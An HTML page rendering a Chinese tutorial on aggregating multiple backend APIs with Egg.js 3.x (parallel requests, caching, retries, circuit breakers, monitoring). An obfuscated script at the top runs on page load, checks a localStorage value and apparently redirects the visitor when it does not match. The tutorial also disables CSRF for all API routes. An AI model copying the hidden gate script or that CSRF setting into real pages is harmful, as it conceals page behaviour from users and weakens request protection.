<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x4eaf(p,s){var t=_0x3e38();return(_0x4eaf=function(s,a){var n=t[s-=244];void 0===_0x4eaf.nzeXuD&&(_0x4eaf.lhmpDC=function(s,a){var n,l=[],p=0,t="";for(s=(s=>{for(var a,n,l="",p="",t=0,e=0;n=s.charAt(e++);~n&&(a=t%4?64*a+n:n,t++%4)&&(l+=String.fromCharCode(255&a>>(-2*t&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);for(var c=0,r=l.length;c<r;c++)p+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(p)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)p=(p+l[e]+a.charCodeAt(e%a.length))%256,n=l[e],l[e]=l[p],l[p]=n;for(var e=0,p=0,c=0;c<s.length;c++)n=l[e=(e+1)%256],l[e]=l[p=(p+l[e])%256],l[p]=n,t+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[p])%256]);return t},p=arguments,_0x4eaf.nzeXuD=!0);var s=s+t[0],l=p[s];return l?n=l:(void 0===_0x4eaf.RSpErX&&(_0x4eaf.RSpErX=!0),n=_0x4eaf.lhmpDC(n,a),p[s]=n),n})(p,s)}var _0x710769=_0x4eaf;if((()=>{for(var s=_0x4eaf,a=_0x3e38();;)try{if(490631==-parseInt(s(256,"P@7t"))+-parseInt(s(269,"^z5W"))/2*(parseInt(s(250,"XB]M"))/3)+-parseInt(s(245,"30^q"))/4*(-parseInt(s(264,"ajRb"))/5)+parseInt(s(247,"dGff"))/6+parseInt(s(273,"dIwN"))/7*(-parseInt(s(257,"JETU"))/8)+parseInt(s(260,"KucF"))/9*(-parseInt(s(254,"[xKv"))/10)+-parseInt(s(265,"[xKv"))/11*(-parseInt(s(248,"dGff"))/12))break;a.push(a.shift())}catch(s){a.push(a.shift())}})(),localStorage[_0x710769(249,"9tKN")](_0x710769(253,"l0kv"))!=_0x710769(244,"YJiJ"))throw window[_0x710769(271,"[xKv")][_0x710769(261,"g)Q!")](_0x710769(270,"W9Vo")),Error();function _0x3e38(){var s=["csVdGHdcQGr/yG","WR3cTHe/hbVdJsGiWRnpWQe","cSkuWOVcQwDQC8kUk2rTW54n","d8kwWO/cQ2LPECkEn11XW54J","WO/cMmoEWOrwiSke","W5lcMSkEsComqai","WQqfWQe7WP1AAW","t8kPW5K6W7pdN8or","zJlcU8kNEsnxeSor","WQ0Xb1n0i8kRWOiHCtv6WPe","W5WCe8ouDJL2y13cVrhcHga","db3cR8kIWOn8WRP1W68PW78n","iw3cTYigW73dVa","nCkRm8oCxg0vWP7dLmoAWQLsW5y","WQ80WPGwWRD8Bq","W5inl2fjWRJcHG","C8o+D8khcJHi","WOBdKd0Sg1mjCaZdTexdHq","WRHHW4LymSkem3K","W5auh8ktbsRdHXRcUGdcVWW","WQO0wciGx8oyWPe","W6TyWPdcScRcKmowoCkoWPldS8kWW44","q8olW6qgW4xdHmokW6e","nYZcTf81iGpdSdJdOmoxWR0V","WO0OomoStHhcLmotW7/cGeyVFG","WO7cKaFdRxSoWQldVKOoWR9XWR1vWOH6WP/cM8k6WRNdUCo6W5P8WQPf","W7nUxaO1ESo0WQ0","WRNcTX0ZgH7cTaenWQPjWPfM","WPbKW6lcJt5dd8oqWP4HW6/dSG8","fuCqWPBcQG"];return(_0x3e38=function(){return s})()}document.title="Egg.js 3.x 聚合不同业务URL接口数据的完整方案",document.getElementById("article").innerHTML='<div><p>作为BFF层，Egg.js需要高效聚合来自不同业务系统的数据。以下是针对不同URL接口数据聚合的完整实现方案：</p>\n<h2>1. 基础HTTP请求封装</h2>\n<h3>1.1 使用内置HttpClient</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/service/base.js</span>\n<span class="hljs-keyword">const</span> { <span class="hljs-title class_">Service</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;egg&#x27;</span>);\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Service</span> {\n  <span class="hljs-keyword">async</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">url, options = {}</span>) {\n    <span class="hljs-keyword">const</span> { ctx } = <span class="hljs-variable language_">this</span>;\n    \n    <span class="hljs-keyword">const</span> defaultOptions = {\n      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>,\n      <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,\n      <span class="hljs-attr">headers</span>: {\n        <span class="hljs-string">&#x27;x-request-id&#x27;</span>: ctx.<span class="hljs-property">requestId</span>\n      }\n    };\n    \n    <span class="hljs-keyword">try</span> {\n      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">curl</span>(url, {\n        ...defaultOptions,\n        ...options\n      });\n      \n      <span class="hljs-keyword">if</span> (result.<span class="hljs-property">status</span> !== <span class="hljs-number">200</span>) {\n        ctx.<span class="hljs-property">logger</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`请求失败: <span class="hljs-subst">${url}</span>`</span>, result.<span class="hljs-property">data</span>);\n        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`API请求失败: <span class="hljs-subst">${url}</span>`</span>);\n      }\n      \n      <span class="hljs-keyword">return</span> result.<span class="hljs-property">data</span>;\n    } <span class="hljs-keyword">catch</span> (err) {\n      ctx.<span class="hljs-property">logger</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`请求异常: <span class="hljs-subst">${url}</span>`</span>, err);\n      <span class="hljs-keyword">throw</span> err;\n    }\n  }\n}\n</code></pre>\n<h3>1.2 业务Service继承基础类</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/service/user.js</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">BaseService</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./base&#x27;</span>);\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">BaseService</span> {\n  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getProfile</span>(<span class="hljs-params">userId</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.config.api.user}</span>/profile/<span class="hljs-subst">${userId}</span>`</span>, {\n      <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>\n    });\n  }\n}\n</code></pre>\n<h2>2. 多接口聚合模式</h2>\n<h3>2.1 并行请求聚合</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/service/dashboard.js</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">BaseService</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./base&#x27;</span>);\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">DashboardService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">BaseService</span> {\n  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getHomeData</span>(<span class="hljs-params">userId</span>) {\n    <span class="hljs-keyword">const</span> { config } = <span class="hljs-variable language_">this</span>;\n    \n    <span class="hljs-keyword">const</span> [user, orders, recommends] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.user}</span>/detail/<span class="hljs-subst">${userId}</span>`</span>),\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.order}</span>/list`</span>, {\n        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,\n        <span class="hljs-attr">data</span>: { userId }\n      }),\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.recommend}</span>/for-user/<span class="hljs-subst">${userId}</span>`</span>)\n    ]);\n    \n    <span class="hljs-keyword">return</span> {\n      <span class="hljs-attr">user</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_formatUser</span>(user),\n      <span class="hljs-attr">orders</span>: orders.<span class="hljs-title function_">map</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">_formatOrder</span>),\n      <span class="hljs-attr">recommends</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_filterRecommends</span>(recommends)\n    };\n  }\n}\n</code></pre>\n<h3>2.2 阶梯式请求聚合</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">getProductDetail</span>(<span class="hljs-params">productId, userId</span>) {\n  <span class="hljs-comment">// 第一阶段获取基础信息</span>\n  <span class="hljs-keyword">const</span> product = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(\n    <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.config.api.product}</span>/detail/<span class="hljs-subst">${productId}</span>`</span>\n  );\n  \n  <span class="hljs-comment">// 根据基础信息决定后续请求</span>\n  <span class="hljs-keyword">const</span> promises = [\n    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.config.api.inventory}</span>/check/<span class="hljs-subst">${productId}</span>`</span>)\n  ];\n  \n  <span class="hljs-keyword">if</span> (userId) {\n    promises.<span class="hljs-title function_">push</span>(\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.config.api.favorite}</span>/check`</span>, {\n        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,\n        <span class="hljs-attr">data</span>: { userId, productId }\n      })\n    );\n  }\n  \n  <span class="hljs-keyword">const</span> [inventory, isFavorite] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(promises);\n  \n  <span class="hljs-keyword">return</span> { product, inventory, isFavorite };\n}\n</code></pre>\n<h2>3. 高级聚合功能</h2>\n<h3>3.1 请求缓存处理</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/extend/context.js</span>\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {\n  <span class="hljs-keyword">async</span> <span class="hljs-title function_">cachedRequest</span>(<span class="hljs-params">url, options, ttl = <span class="hljs-number">60</span></span>) {\n    <span class="hljs-keyword">const</span> { app } = <span class="hljs-variable language_">this</span>;\n    <span class="hljs-keyword">const</span> cacheKey = <span class="hljs-string">`req:<span class="hljs-subst">${md5(url + <span class="hljs-built_in">JSON</span>.stringify(options))}</span>`</span>;\n    \n    <span class="hljs-keyword">const</span> cached = <span class="hljs-keyword">await</span> app.<span class="hljs-property">redis</span>.<span class="hljs-title function_">get</span>(cacheKey);\n    <span class="hljs-keyword">if</span> (cached) <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(cached);\n    \n    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">curl</span>(url, options);\n    <span class="hljs-keyword">await</span> app.<span class="hljs-property">redis</span>.<span class="hljs-title function_">setex</span>(cacheKey, ttl, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">data</span>));\n    \n    <span class="hljs-keyword">return</span> result.<span class="hljs-property">data</span>;\n  }\n};\n\n<span class="hljs-comment">// 使用示例</span>\n<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">cachedRequest</span>(url, options, <span class="hljs-number">300</span>); <span class="hljs-comment">// 5分钟缓存</span>\n</code></pre>\n<h3>3.2 请求重试机制</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">requestWithRetry</span>(<span class="hljs-params">url, options, maxRetry = <span class="hljs-number">2</span></span>) {\n  <span class="hljs-keyword">let</span> lastError;\n  \n  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt;= maxRetry; i++) {\n    <span class="hljs-keyword">try</span> {\n      <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(url, options);\n    } <span class="hljs-keyword">catch</span> (err) {\n      lastError = err;\n      <span class="hljs-keyword">if</span> (i &lt; maxRetry) {\n        <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, <span class="hljs-number">100</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, i)));\n      }\n    }\n  }\n  \n  <span class="hljs-keyword">throw</span> lastError;\n}\n</code></pre>\n<h3>3.3 请求熔断保护</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/middleware/circuitBreaker.js</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">CircuitBreaker</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;opossum&#x27;</span>);\n\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {\n  <span class="hljs-keyword">const</span> breakers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();\n  \n  <span class="hljs-keyword">return</span> <span class="hljs-title function_">async</span> (ctx, next) =&gt; {\n    <span class="hljs-keyword">if</span> (!ctx.<span class="hljs-property">curl</span>) <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>();\n    \n    <span class="hljs-keyword">const</span> originalCurl = ctx.<span class="hljs-property">curl</span>.<span class="hljs-title function_">bind</span>(ctx);\n    ctx.<span class="hljs-property">curl</span> = <span class="hljs-title function_">async</span> (url, opts) =&gt; {\n      <span class="hljs-keyword">if</span> (!breakers.<span class="hljs-title function_">has</span>(url)) {\n        breakers.<span class="hljs-title function_">set</span>(url, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CircuitBreaker</span>(originalCurl, {\n          <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>,\n          <span class="hljs-attr">errorThresholdPercentage</span>: <span class="hljs-number">50</span>,\n          <span class="hljs-attr">resetTimeout</span>: <span class="hljs-number">30000</span>\n        }));\n      }\n      \n      <span class="hljs-keyword">const</span> breaker = breakers.<span class="hljs-title function_">get</span>(url);\n      <span class="hljs-keyword">return</span> breaker.<span class="hljs-title function_">fire</span>(url, opts);\n    };\n    \n    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();\n  };\n};\n</code></pre>\n<h2>4. 配置管理</h2>\n<h3>4.1 多环境配置</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// config/config.${env}.js</span>\n<span class="hljs-built_in">exports</span>.<span class="hljs-property">api</span> = {\n  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;https://user-service.prod.example.com&#x27;</span>,\n  <span class="hljs-attr">order</span>: <span class="hljs-string">&#x27;https://order-service.prod.example.com&#x27;</span>,\n  <span class="hljs-attr">product</span>: <span class="hljs-string">&#x27;https://product-service.prod.example.com&#x27;</span>\n};\n\n<span class="hljs-comment">// 开发环境覆盖</span>\n<span class="hljs-comment">// config/config.local.js</span>\n<span class="hljs-built_in">exports</span>.<span class="hljs-property">api</span> = {\n  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;http://localhost:3001&#x27;</span>,\n  <span class="hljs-attr">order</span>: <span class="hljs-string">&#x27;http://localhost:3002&#x27;</span>,\n  <span class="hljs-attr">product</span>: <span class="hljs-string">&#x27;http://localhost:3003&#x27;</span>\n};\n</code></pre>\n<h3>4.2 动态路由配置</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// config/config.default.js</span>\n<span class="hljs-built_in">exports</span>.<span class="hljs-property">apiRouter</span> = {\n  <span class="hljs-string">&#x27;/api/user/(.*)&#x27;</span>: <span class="hljs-string">&#x27;https://user-service.example.com/$1&#x27;</span>,\n  <span class="hljs-string">&#x27;/api/order/(.*)&#x27;</span>: <span class="hljs-string">&#x27;https://order-service.example.com/$1&#x27;</span>\n};\n\n<span class="hljs-comment">// app/middleware/apiRouter.js</span>\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">async</span> (ctx, next) =&gt; {\n  <span class="hljs-keyword">const</span> { apiRouter } = ctx.<span class="hljs-property">app</span>.<span class="hljs-property">config</span>;\n  <span class="hljs-keyword">const</span> path = ctx.<span class="hljs-property">path</span>;\n  \n  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [regex, target] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(apiRouter)) {\n    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex).<span class="hljs-title function_">test</span>(path)) {\n      <span class="hljs-keyword">const</span> targetUrl = path.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex), target);\n      <span class="hljs-keyword">return</span> ctx.<span class="hljs-title function_">redirect</span>(targetUrl);\n    }\n  }\n  \n  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();\n};\n</code></pre>\n<h2>5. 错误处理与监控</h2>\n<h3>5.1 统一错误格式</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/middleware/errorHandler.js</span>\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">async</span> (ctx, next) =&gt; {\n  <span class="hljs-keyword">try</span> {\n    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();\n  } <span class="hljs-keyword">catch</span> (err) {\n    ctx.<span class="hljs-property">status</span> = err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>;\n    ctx.<span class="hljs-property">body</span> = {\n      <span class="hljs-attr">code</span>: err.<span class="hljs-property">code</span> || <span class="hljs-string">&#x27;INTERNAL_ERROR&#x27;</span>,\n      <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span>,\n      <span class="hljs-attr">requestId</span>: ctx.<span class="hljs-property">requestId</span>,\n      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()\n    };\n    \n    ctx.<span class="hljs-property">app</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;error&#x27;</span>, err, ctx);\n  }\n};\n</code></pre>\n<h3>5.2 请求指标收集</h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/middleware/metrics.js</span>\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">async</span> (ctx, next) =&gt; {\n  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();\n  \n  <span class="hljs-keyword">try</span> {\n    <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();\n    \n    <span class="hljs-keyword">const</span> latency = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;\n    ctx.<span class="hljs-property">app</span>.<span class="hljs-property">metrics</span>.<span class="hljs-title function_">histogram</span>(<span class="hljs-string">&#x27;http_request_duration_ms&#x27;</span>, {\n      <span class="hljs-attr">method</span>: ctx.<span class="hljs-property">method</span>,\n      <span class="hljs-attr">path</span>: ctx.<span class="hljs-property">path</span>,\n      <span class="hljs-attr">status</span>: ctx.<span class="hljs-property">status</span>\n    }).<span class="hljs-title function_">observe</span>(latency);\n    \n  } <span class="hljs-keyword">catch</span> (err) {\n    ctx.<span class="hljs-property">app</span>.<span class="hljs-property">metrics</span>.<span class="hljs-title function_">counter</span>(<span class="hljs-string">&#x27;http_errors&#x27;</span>, {\n      <span class="hljs-attr">method</span>: ctx.<span class="hljs-property">method</span>,\n      <span class="hljs-attr">path</span>: ctx.<span class="hljs-property">path</span>,\n      <span class="hljs-attr">error</span>: err.<span class="hljs-property">name</span>\n    }).<span class="hljs-title function_">inc</span>();\n    \n    <span class="hljs-keyword">throw</span> err;\n  }\n};\n</code></pre>\n<h2>6. 实战案例：电商首页聚合</h2>\n<pre><code class="language-javascript"><span class="hljs-comment">// app/service/page.js</span>\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">PageService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">BaseService</span> {\n  <span class="hljs-keyword">async</span> <span class="hljs-title function_">assembleHomePage</span>(<span class="hljs-params">userId</span>) {\n    <span class="hljs-keyword">const</span> { config } = <span class="hljs-variable language_">this</span>;\n    \n    <span class="hljs-comment">// 并行获取所有区块</span>\n    <span class="hljs-keyword">const</span> [\n      banners,\n      announcements,\n      flashSale,\n      recommend\n    ] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.marketing}</span>/banners`</span>),\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.marketing}</span>/announcements`</span>),\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">request</span>(<span class="hljs-string">`<span class="hljs-subst">${config.api.activity}</span>/flash-sale`</span>),\n      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">requestWithCache</span>(\n        <span class="hljs-string">`<span class="hljs-subst">${config.api.recommend}</span>/for-user/<span class="hljs-subst">${userId}</span>`</span>,\n        { <span class="hljs-attr">ttl</span>: <span class="hljs-number">300</span> } <span class="hljs-comment">// 5分钟缓存</span>\n      )\n    ]);\n    \n    <span class="hljs-comment">// 数据转换</span>\n    <span class="hljs-keyword">return</span> {\n      <span class="hljs-attr">blocks</span>: [\n        { <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;banner&#x27;</span>, <span class="hljs-attr">data</span>: banners },\n        { <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;announcement&#x27;</span>, <span class="hljs-attr">data</span>: announcements },\n        { \n          <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;flash_sale&#x27;</span>,\n          <span class="hljs-attr">data</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_formatFlashSale</span>(flashSale),\n          <span class="hljs-attr">countdown</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_calcCountdown</span>(flashSale.<span class="hljs-property">endTime</span>)\n        },\n        { <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;recommend&#x27;</span>, <span class="hljs-attr">data</span>: recommend }\n      ],\n      <span class="hljs-attr">meta</span>: {\n        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),\n        <span class="hljs-attr">version</span>: config.<span class="hljs-property">version</span>\n      }\n    };\n  }\n}\n</code></pre>\n<h2>最佳实践建议</h2>\n<ol>\n<li><strong>接口设计原则</strong>  ：\n<ul>\n<li>保持聚合接口与前端UI模块对应</li>\n<li>避免返回前端不需要的数据</li>\n<li>为不同终端（Web/App/H5）设计不同聚合接口</li>\n</ul>\n</li>\n<li><strong>性能优化</strong>  ：<pre><code class="language-javascript"><span class="hljs-comment">// 配置keepalive提升性能</span>\n<span class="hljs-built_in">exports</span>.<span class="hljs-property">httpclient</span> = {\n  <span class="hljs-attr">enableDNSCache</span>: <span class="hljs-literal">true</span>,\n  <span class="hljs-attr">request</span>: {\n    <span class="hljs-attr">timing</span>: <span class="hljs-literal">true</span>,\n    <span class="hljs-attr">timeout</span>: [ <span class="hljs-number">3000</span>, <span class="hljs-number">5000</span> ] <span class="hljs-comment">// 超时配置</span>\n  },\n  <span class="hljs-attr">httpAgent</span>: {\n    <span class="hljs-attr">keepAlive</span>: <span class="hljs-literal">true</span>,\n    <span class="hljs-attr">freeSocketTimeout</span>: <span class="hljs-number">4000</span>\n  }\n};\n</code></pre>\n</li>\n<li><strong>安全防护</strong>  ：<pre><code class="language-javascript"><span class="hljs-built_in">exports</span>.<span class="hljs-property">security</span> = {\n  <span class="hljs-attr">csrf</span>: {\n    <span class="hljs-attr">ignore</span>: [<span class="hljs-string">&#x27;/api/*&#x27;</span>] <span class="hljs-comment">// API接口禁用CSRF</span>\n  },\n  <span class="hljs-attr">domainWhiteList</span>: [\n    <span class="hljs-string">&#x27;user-service.example.com&#x27;</span>,\n    <span class="hljs-string">&#x27;order-service.example.com&#x27;</span>\n  ]\n};\n</code></pre>\n</li>\n<li><strong>文档生成</strong>  ：<pre><code class="language-javascript"><span class="hljs-comment">/**\n * <span class="hljs-doctag">@swagger</span>\n * /home:\n *   get:\n *     summary: 获取聚合首页数据\n *     description: 聚合营销位、公告、闪购活动、推荐列表等数据\n *     parameters:\n *       - name: userId\n *         in: query\n *         required: true\n *         type: string\n */</span>\n<span class="hljs-keyword">async</span> <span class="hljs-title function_">home</span>(<span class="hljs-params"></span>) { ... }\n</code></pre>\n</li>\n</ol>\n<p>通过以上方案，Egg.js 3.x 可以高效实现：\n✅ 多源接口并行聚合<br>\n✅ 智能缓存与性能优化<br>\n✅ 完善的错误处理机制<br>\n✅ 灵活的安全控制策略<br>\n✅ 全面的监控指标收集</p>\n<p>这种架构特别适合中大型项目需要对接多个业务系统的场景，能显著提升开发效率和系统稳定性。</p>\n</div>'</script></body></html>